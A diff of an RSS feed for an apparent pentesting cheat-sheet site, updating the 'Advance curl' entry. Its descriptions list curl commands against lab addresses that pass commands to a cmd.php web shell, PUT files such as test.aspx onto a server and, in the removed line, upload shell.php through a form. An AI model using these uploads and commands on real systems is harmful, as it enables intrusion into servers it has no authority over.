@@ -26,7 +26,7 @@
       <link>https://tldrbins.github.io/advance_curl/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/advance_curl/</guid>
-      <description>Advance curl # POST url-encoded data curl --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://10.10.11.10/cmd.php # PUT a file curl -X PUT http://10.10.11.10/test.txt -d @test.txt # PUT a file (with creds) curl -X PUT http://user:password@10.10.11.10/test.txt -d @test.txt # Put a file as raw binary format (preserve newlines and control characters) curl -X PUT http://10.10.11.10/test.txt --data-binary @test.aspx # POST a file with form param `file` curl -X POST -F &amp;#34;file=@shell.php;type=application/php;filename=shell.php&amp;#34; http://10.10.11.10/upload # POST a file in raw-text format (not as attachment) with form param `file` curl -X POST -F &amp;#39;file=&amp;lt;shell.</description>
+      <description>Advance curl # POST url-encoded data curl --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://10.10.11.10/cmd.php # Put the POST data to url and use GET curl -G --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://10.10.11.10/cmd.php # PUT a file curl -X PUT http://10.10.11.10/test.txt -d @test.txt # PUT a file (with creds) curl -X PUT http://user:password@10.10.11.10/test.txt -d @test.txt # Put a file as raw binary format (preserve newlines and control characters) curl -X PUT http://10.10.11.10/test.txt --data-binary @test.</description>
     </item>
     <item>
       <title>File Transfer (Linux To Linux)</title>
